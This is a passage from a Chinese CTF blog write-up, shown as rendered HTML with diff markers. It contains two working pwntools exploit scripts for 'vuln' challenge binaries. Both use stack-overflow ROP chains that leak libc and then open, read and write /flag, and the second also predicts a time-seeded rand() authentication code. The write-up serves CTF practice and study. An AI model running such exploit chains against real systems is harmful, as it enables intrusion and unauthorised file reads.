+</span></span><span class="line"><span class="cl"><span class="cp">#p=remote(&#34;pwn-d929761f60.challenge.xctf.org.cn&#34;, 9999, ssl=True)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">vuln</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span><span class="o">=</span><span class="mh">0x0000000000401393</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#34;lets move and pwn!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">b</span><span class="sc">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="err">&#39;</span><span class="n">puts</span><span class="err">&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="err">&#39;</span><span class="n">puts</span><span class="err">&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4012F0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#bug()
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x7f</span><span class="s">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="o">:</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">b</span><span class="sc">&#39;\x00&#39;</span><span class="p">))</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">puts</span><span class="err">&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000023b6a</span>
+</span></span><span class="line"><span class="cl"><span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002601f</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000142c92</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx_r12</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000119211</span>
+</span></span><span class="line"><span class="cl"><span class="n">rax</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000036174</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000022679</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002284d</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">open</span><span class="err">&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">read</span><span class="err">&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">mprotect</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="err">&#39;</span><span class="n">mprotect</span><span class="err">&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span><span class="o">=</span><span class="mh">0x404060</span><span class="o">+</span><span class="mh">0x500</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#34;lets move and pwn!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">b</span><span class="sc">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4012EE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#bug()
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#pause()
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">orw</span>  <span class="o">=</span> <span class="n">b</span><span class="err">&#39;</span><span class="o">/</span><span class="n">flag</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>  <span class="err">#</span><span class="o">/</span><span class="n">flag的字符串位置</span><span class="err">，要改</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">open_</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span> <span class="err">#读入</span><span class="n">flag的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span> <span class="err">#读入</span><span class="n">flag的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#pr(hex(len(orw)))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">orw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="signin">
+<a class="header-anchor" href="#signin"></a>
+signin
+</h2><p>日常检查</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/bbq/桌面/啊布拉布拉/11111/vuln&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x3f7000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ 
+</span></span></code></pre></div><p>两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#34;pwn-ecdfbe9bc0.challenge.xctf.org.cn&#34;, 9999, ssl=True)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xun</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(payload)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Input the authentication code:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">#payload = str((elf1.rand()%100) + 1)</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">#p.send(payload)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf1</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">100</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">       <span class="c1"># sleep(0.1)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span><span class="o">=</span><span class="mh">0x0000000000401893</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#pause</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#sleep(0.5)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf1</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#elf1=ctypes.LoadLibrary(&#34;./libc.so.6&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf1</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">elf1</span><span class="o">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>    <span class="c1">#与题目相同以时间为种子</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xun</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Note: &#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000040177B</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#bug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#print(hex(libc_base))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000023b6a</span>
+</span></span><span class="line"><span class="cl"><span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002601f</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000142c92</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx_r12</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000119211</span>
+</span></span><span class="line"><span class="cl"><span class="n">rax</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000036174</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000022679</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002284d</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">mprotect</span><span class="o">=</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span><span class="o">=</span><span class="mh">0x404060</span><span class="o">+</span><span class="mh">0x500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#sleep(0.5)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf1</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#elf1=ctypes.LoadLibrary(&#34;./libc.so.6&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf1</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">elf1</span><span class="o">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>    <span class="c1">#与题目相同以时间为种子</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xun</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Note: &#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#rl(&#34;lets move and pwn!&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0004013EE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#bug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">orw</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00\x00\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>  <span class="c1">#/flag的字符串位置，要改</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">open_</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1">#读入flag的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1">#读入flag的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">orw</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#print(hex(len(orw)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">orw</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">orw</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_154.webp"
+              data-sizes="auto"
+              alt="THM Watcher"
+              class="lazyload"
+            /><a
+          href="/post/thm-watcher/"
+          aria-label="前一篇:THM Watcher"
+          title="前一篇:THM Watcher"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">THM Watcher</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_81.webp"
+              data-sizes="auto"
+              alt="THM Enterprise"
+              class="lazyload"
+            /><a
+          href="/post/thm-enterprise/"
+          aria-label="后一篇:THM Enterprise"
+          title="后一篇:THM Enterprise"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">THM Enterprise</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
